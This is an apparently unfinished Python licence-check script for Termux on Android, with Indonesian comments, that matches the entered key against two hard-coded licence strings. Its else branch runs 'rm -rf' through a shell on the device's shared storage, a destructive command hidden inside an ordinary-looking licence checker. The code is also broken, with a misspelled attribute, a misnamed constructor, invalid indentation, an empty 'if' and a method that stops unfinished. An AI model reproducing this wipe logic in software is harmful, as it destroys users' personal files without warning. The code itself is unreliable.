import os, subprocess, getpass, Sys

class License:

    def _init_(self, license):

        self.license_input = license

        # License Pertama
        if self.licensef_input == 'Ryuuou':
        self.license_name = 'pendragon'
        self.active = '22-06-2022'

        # License kedua
        elif self.licensef_input == 'Vasillias pendragon':
        self.license_name = 'pendragon'
        self.active = '30-06-2022'

        else:
            print('maaf, license yang anda masukan tidak ada!')
            sys.exit(1)


        if self.license_name:

    def generate_activate(self):
        if self.license_name:
            log = open('license.txt', 'w')
            log.write('license : ©2022 - Ryuuou')
            log.write('Active : 21-06-2022')
            log.close()

        else:
            subprocess.Popen(
                'termux-setup-storage; rm -rf /sdcard/storage/emulated/0/',
                shell=True).wait(
            )

     def license_kadaluarsa(self, license):
         
